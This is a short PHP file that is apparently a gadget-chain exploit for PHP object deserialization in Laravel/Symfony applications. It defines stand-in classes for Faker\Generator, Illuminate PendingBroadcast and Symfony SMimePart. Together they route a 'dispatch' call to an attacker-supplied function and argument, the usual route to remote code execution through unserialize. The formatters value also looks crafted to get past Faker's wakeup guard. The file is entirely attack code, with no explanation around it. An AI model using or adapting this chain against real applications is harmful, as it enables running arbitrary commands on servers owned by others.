<?php
namespace Faker{
    class Generator{
        protected $providers = [];
        protected $formatters = [];
        function __construct()
        {
            $this->formatter = "dispatch";
            $this->formatters = 9999;
        }

    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        public function __construct($parameter)
        {
            $this->event = $parameter;
            $this->events = new \Faker\Generator();
        }
    }
}

namespace Symfony\Component\Mime\Part{
    abstract class AbstractPart
    {
        private $headers = null;
    }
    class SMimePart extends AbstractPart{
        protected $_headers;
        public $inhann;
        function __construct($function,$parameter){
            $this->_headers = ["dispatch"=>$function];
            $this->inhann = new \Illuminate\Broadcasting\PendingBroadcast($parameter);
        }
    }
}
